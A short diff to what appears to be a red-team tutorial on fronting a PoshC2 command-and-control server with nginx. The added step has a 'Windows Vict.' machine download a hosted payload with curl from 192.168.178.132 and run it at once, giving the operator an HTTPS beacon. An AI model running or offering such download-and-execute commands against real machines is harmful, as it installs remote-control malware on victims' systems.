@@ -28,4 +28,8 @@
     ```
 
 5. Now we just reload our nginx service and it should apply all our changes
-6. 
+6. On our Windows Vict. lets download our hosted payload through our proxy using `curl`
+    ```bash
+    curl -k https://192.168.178.132/<poshc2-uri> -o apples.exe && .\apples.exe
+    ```
+7. Boom you now have a HTTPS beacon. 
